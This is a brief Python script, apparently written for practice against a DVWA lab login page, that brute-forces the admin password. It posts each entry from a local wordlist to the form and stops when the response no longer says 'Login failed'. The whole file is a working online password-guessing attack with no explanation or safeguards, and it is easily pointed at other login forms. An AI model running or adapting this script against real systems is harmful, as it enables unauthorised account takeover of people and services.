import requests

targert_url="http://192.168.37.134/dvwa/login.php"
data_dict={"username":"admin","password":"","Login":"submit"}

print("[+] Searching Password Please Wait")
with open(r"C:\Users\Windows 10\Desktop\password.txt","r") as word_file:
	for i in word_file:
		word=i.strip()
		data_dict["password"]=word
		response=requests.post(targert_url,data=data_dict)

		if "Login failed".encode() not in response.content:
			print("[+] Got the Password --> "+ word)

			exit()

print("[-] Password Not Found")